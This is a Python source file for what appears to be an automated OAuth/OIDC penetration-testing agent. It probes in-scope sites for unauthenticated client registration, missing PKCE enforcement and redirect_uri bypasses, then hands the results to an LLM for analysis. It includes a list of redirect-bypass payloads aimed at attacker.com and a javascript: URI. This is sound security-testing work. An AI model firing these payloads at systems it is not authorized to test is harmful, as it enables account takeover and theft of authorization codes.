"""OAuthChainAgent — OAuth/OIDC attack chain testing."""
from __future__ import annotations

import json
import re
import uuid
from pathlib import Path
from urllib.parse import urljoin, urlparse

import httpx

from app.agents.base import BaseAgent
from app.agents.orchestrator import register_agent
from app.config import settings
from app.db.models import Finding, FindingStatus, Severity

_PROMPT_PATH = Path(__file__).parent.parent / "prompts" / "oauth_chain.md"

_OAUTH_PATHS = [
    "/.well-known/openid-configuration",
    "/.well-known/oauth-authorization-server",
    "/oauth/authorize",
    "/oauth2/authorize",
    "/auth/realms/master/protocol/openid-connect/auth",
    "/connect/authorize",
    "/o/oauth2/auth",
    "/oauth/token",
    "/oauth2/token",
    "/oauth/register",
    "/connect/register",
]

_REDIRECT_BYPASS_PAYLOADS = [
    "https://attacker.com",
    "https://attacker.com/",
    "{registered}@attacker.com",
    "{registered}/../../../attacker.com",
    "{registered}%2F%2Fattacker.com",
    "{registered}%2523attacker.com",
    "{registered}?redirect=https://attacker.com",
    "javascript:alert(1)",
]


@register_agent
class OauthChainAgent(BaseAgent):
    name = "oauth_chain"

    async def _execute(self) -> dict:
        system_prompt = _PROMPT_PATH.read_text()
        scope_urls: list[str] = self.engagement.scope_urls
        findings: list[dict] = []

        for base_url in scope_urls:
            await self._emit("trace", {"message": f"OAuth scan: {base_url}"})
            try:
                oidc_config = await self._fetch_oidc_config(base_url)
                if oidc_config:
                    await self._emit("trace", {"message": f"OIDC config found at {base_url}"})
                    findings.extend(await self._test_oauth_endpoint(base_url, oidc_config))
                else:
                    # Try blind discovery
                    for path in _OAUTH_PATHS:
                        endpoint = urljoin(base_url.rstrip("/") + "/", path.lstrip("/"))
                        discovered = await self._probe_path(endpoint)
                        if discovered:
                            await self._emit("trace", {"message": f"OAuth endpoint: {endpoint}"})
                            findings.extend(await self._test_oauth_endpoint(base_url, {"authorization_endpoint": endpoint}))
            except Exception as e:
                await self._emit("trace", {"message": f"Error {base_url}: {e}"})

        # LLM analysis for any promising findings
        if findings:
            try:
                analysis, _ = await self.llm.complete(
                    model=settings.llm_heavy,
                    system=system_prompt,
                    messages=[{
                        "role": "user",
                        "content": f"Analyze these OAuth test results and identify exploitable chains:\n{json.dumps(findings, indent=2)}",
                    }],
                    max_tokens=4096,
                )
                await self._emit("trace", {"message": "LLM OAuth analysis complete"})
                await self._persist_findings(findings, analysis)
            except Exception as e:
                await self._emit("trace", {"message": f"LLM analysis error: {e}"})

        await self._emit("trace", {"message": f"OAuth scan done: {len(findings)} raw findings"})
        return {"findings_count": len(findings), "raw": findings}

    async def _fetch_oidc_config(self, base_url: str) -> dict | None:
        url = urljoin(base_url.rstrip("/") + "/", ".well-known/openid-configuration")
        async with httpx.AsyncClient(timeout=10, follow_redirects=True) as client:
            try:
                r = await client.get(url)
                if r.is_success and "issuer" in r.text:
                    return r.json()
            except Exception:
                pass
        return None

    async def _probe_path(self, url: str) -> bool:
        async with httpx.AsyncClient(timeout=8, follow_redirects=False) as client:
            try:
                r = await client.get(url)
                return r.status_code not in (404, 410)
            except Exception:
                return False

    async def _test_oauth_endpoint(self, base_url: str, config: dict) -> list[dict]:
        results: list[dict] = []
        auth_ep = config.get("authorization_endpoint", "")
        reg_ep = config.get("registration_endpoint", "")
        token_ep = config.get("token_endpoint", "")

        # Test 1: Dynamic client registration without auth
        if reg_ep:
            result = await self._test_dynamic_registration(reg_ep)
            if result:
                results.append(result)

        # Test 2: PKCE stripping
        if auth_ep:
            result = await self._test_pkce_strip(auth_ep)
            if result:
                results.append(result)

        # Test 3: redirect_uri bypass
        if auth_ep:
            result = await self._test_redirect_bypass(auth_ep)
            if result:
                results.append(result)

        return results

    async def _test_dynamic_registration(self, reg_endpoint: str) -> dict | None:
        payload = {
            "client_name": "zwan-test",
            "redirect_uris": ["https://attacker.com/callback"],
            "grant_types": ["authorization_code"],
            "response_types": ["code"],
        }
        async with httpx.AsyncClient(timeout=10) as client:
            try:
                r = await client.post(reg_endpoint, json=payload)
                if r.status_code in (200, 201) and "client_id" in r.text:
                    return {
                        "type": "dynamic_client_registration",
                        "endpoint": reg_endpoint,
                        "response": r.text[:500],
                        "severity": "high",
                        "description": "Unauthenticated OAuth dynamic client registration succeeds. Attacker can register rogue client and steal auth codes.",
                        "http_transcript": f"POST {reg_endpoint}\n{json.dumps(payload)}\n\n{r.status_code}\n{r.text[:500]}",
                    }
            except Exception:
                pass
        return None

    async def _test_pkce_strip(self, auth_endpoint: str) -> dict | None:
        # Check if the endpoint rejects requests without code_challenge
        params = {
            "response_type": "code",
            "client_id": "test",
            "redirect_uri": "https://example.com",
            "scope": "openid",
            "state": "random_state",
            # Intentionally omitting code_challenge and code_challenge_method
        }
        async with httpx.AsyncClient(timeout=10, follow_redirects=False) as client:
            try:
                r = await client.get(auth_endpoint, params=params)
                # If server redirects with code (not error), PKCE not enforced
                loc = r.headers.get("location", "")
                if r.status_code in (301, 302, 303) and "error" not in loc and "code" in loc:
                    return {
                        "type": "pkce_not_enforced",
                        "endpoint": auth_endpoint,
                        "response_code": r.status_code,
                        "location": loc[:200],
                        "severity": "medium",
                        "description": "PKCE not enforced — auth code issued without code_challenge. Enables auth code interception attacks.",
                        "http_transcript": f"GET {auth_endpoint}\nParams: {params}\n\n{r.status_code} {loc}",
                    }
            except Exception:
                pass
        return None

    async def _test_redirect_bypass(self, auth_endpoint: str) -> dict | None:
        # Try various redirect_uri bypass payloads
        for payload in _REDIRECT_BYPASS_PAYLOADS[:4]:  # limit to 4 to save time
            params = {
                "response_type": "code",
                "client_id": "test",
                "redirect_uri": payload,
                "scope": "openid",
                "state": "test",
            }
            async with httpx.AsyncClient(timeout=8, follow_redirects=False) as client:
                try:
                    r = await client.get(auth_endpoint, params=params)
                    loc = r.headers.get("location", "")
                    if r.status_code in (301, 302) and "attacker.com" in loc:
                        return {
                            "type": "redirect_uri_bypass",
                            "endpoint": auth_endpoint,
                            "payload": payload,
                            "location": loc[:200],
                            "severity": "high",
                            "description": f"redirect_uri bypass: server redirected to attacker.com with payload: {payload}",
                            "http_transcript": f"GET {auth_endpoint}\nredirect_uri={payload}\n\n{r.status_code} Location: {loc}",
                        }
                except Exception:
                    pass
        return None

    async def _persist_findings(self, raw: list[dict], llm_analysis: str) -> None:
        for item in raw:
            sev_map = {"critical": Severity.CRITICAL, "high": Severity.HIGH, "medium": Severity.MEDIUM}
            sev = sev_map.get(item.get("severity", "medium"), Severity.MEDIUM)
            finding = Finding(
                id=str(uuid.uuid4()),
                engagement_id=self.engagement.id,
                title=f"OAuth: {item.get('type', 'unknown').replace('_', ' ').title()}",
                severity=sev,
                status=FindingStatus.PENDING,
                description=item.get("description", ""),
                reproducer=item.get("http_transcript", ""),
                impact=item.get("description", ""),
                http_transcript=item.get("http_transcript", ""),
                meta={"raw": item, "llm_analysis": llm_analysis[:2000]},
            )
            self.db.add(finding)
        await self.db.commit()
